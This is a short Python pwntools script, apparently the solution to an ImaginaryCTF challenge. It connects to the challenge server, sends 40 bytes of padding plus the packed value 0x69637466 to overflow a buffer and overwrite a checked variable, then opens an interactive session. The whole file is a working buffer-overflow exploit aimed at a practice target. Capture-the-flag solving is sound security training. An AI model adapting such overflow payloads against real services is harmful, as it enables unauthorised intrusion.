from pwn import *

p = remote("chal.imaginaryctf.org", 42001)

p.recvuntil("color?\n")

padding = b'A'*40

payload = padding + p64(0x69637466)

p.sendline(payload)
p.interactive()
